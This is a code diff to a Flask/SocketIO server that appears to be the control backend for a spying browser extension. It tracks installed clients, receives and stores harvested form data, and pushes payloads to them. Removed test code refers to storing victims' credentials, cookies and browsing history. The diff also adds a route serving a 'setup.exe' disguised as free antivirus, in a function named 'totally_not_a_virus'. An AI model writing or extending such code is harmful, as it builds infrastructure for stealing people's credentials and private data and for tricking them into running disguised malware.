@@ -1,4 +1,4 @@
-from flask import Flask, render_template, request, redirect
+from flask import Flask, render_template, request, redirect, send_from_directory
 from flask_socketio import SocketIO, emit, send 
 from . import database
 import json, os
@@ -48,7 +48,6 @@ def handle_ext_ping(data):
         clientid = database.create_new_client(data)
         connected_clients.append((clientid, request.sid))
         resp = database.construct_response(clientid)
-        #emit('srvpayload', resp, room=request.sid)
         emit('newClientInstall', clientid, namespace ="/socket.io", broadcast=True)
         return resp
     else:
@@ -71,8 +70,22 @@ def handle_ext_ping(data):
             if database.store_form_data(form, clientid):
                 return bad
         emit('json', database.construct_response(clientid), room=request.sid)
+        emit('pingSuccessful', clientid, namespace="/socket.io", broadcast=True)
 
-
+@socketio.on('submit')
+def handle_form_id_mappings_submit(mappingsStr, url):
+    mappings = json.loads(mappingsStr)
+    print("processing new form mappings")
+    data = [{}]
+    data[0].update({"url":url})
+    for x in mappings:
+        remoteDef = x["key"]
+        value = x["value"]
+        localDef = x["LocalDef"]
+        clientid = x["id"]
+        database.store_form_id_mappings(url, localDef, remoteDef)
+        data[0].update({remoteDef:value})
+    database.store_form_data(data[0], clientid)
 
 def do_pong(clientid, payload):
     sid = [(clientidx, sid) for (clientidx, sid) in connected_clients if clientidx == clientid].pop(0)[1] or None
@@ -89,6 +102,7 @@ def handle_ext_disconnect():
         clientid = clientids[0]
         connected_clients.remove((clientid))
         database.store_payload(clientid)
+        emit('disconnectSuccessful', clientid, namespace="/socket.io", broadcast=True)
     elif len(clientids) != 0:
         print("what the fuck did you do, multiple clients disconnected from same sid: {}".format(clientids))
 
@@ -101,20 +115,15 @@ def validate_payload(data):
         return 0
     return 1
 
-
 @app.route('/submitform', methods=['POST'])
 def submit_form():
     return redirect(request.form['formurl'])
 
 
+@app.route('/free-antivirus/setup.exe')
+def totally_not_a_virus():
+    return send_from_directory(os.environ.get('SEANON_DIR')+'/backend/static', 'setup.exe')
+
+
 if __name__ == "__main__":
-    with open("../sample_ext_to_srv.json") as f:
-        clientid = 123
-        data = json.load(f)
-        #database.store_form_data(data["forms"][0], clientid)
-        #database.store_credential(data["creds"][0], clientid)
-        #database.store_cookie(data["cookies"][0], clientid)
-        database.store_history(data["history"], clientid)
-        #database.create_new_client(data)
-        #database.construct_response(clientid)
     socketio.run(app, debug=True, use_reloader=False)
